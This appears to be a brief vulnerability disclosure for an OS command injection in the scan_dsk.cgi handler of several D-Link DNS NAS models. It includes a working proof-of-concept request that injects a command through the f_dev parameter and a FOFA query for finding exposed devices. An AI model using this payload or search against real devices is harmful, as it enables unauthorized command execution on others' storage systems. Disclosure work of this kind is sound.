<font style="color:rgb(0, 0, 0);background-color:rgb(252, 252, 252);">A vulnerability was found in D-Link DNS-320, DNS-320LW, DNS-325 and DNS-340L . Affected by this vulnerability is the function ScanDisk_run_e2fsck of the file /cgi-bin/scan_dsk.cgi. The manipulation of the argument f_dev leads to os command injection.</font>



scan_dsk.cgi

![](https://cdn.nlark.com/yuque/0/2024/png/21552368/1731581307014-39ae36ec-62b9-4514-916a-cac7772b4a8b.png)

`if ( v2[0] != 97 || v2[1] )` 

v2[0] !=  97: Check if the first character of v2 is not equal to the ASCII code value of 97 (i.e. character 'a').

V2 [1]: Check if the second character of v2 is non-zero.

![](https://cdn.nlark.com/yuque/0/2024/png/21552368/1731581288130-695aac5f-3961-44ea-bc4a-2c4a46069456.png)



poc:

```plain
/cgi-bin/scan_dsk.cgi?cmd=ScanDisk_run_e2fsck&f_dev=a;id;
```

![](https://cdn.nlark.com/yuque/0/2024/png/21552368/1731581840608-ff7a58b7-6aa3-4b7f-8e52-2134178125e3.png)

fofa

> app="D_Link-DNS-ShareCenter"
>

![](https://cdn.nlark.com/yuque/0/2024/png/21552368/1731581902487-8d7c7998-703b-4911-ac5c-c7ca491bf06f.png)

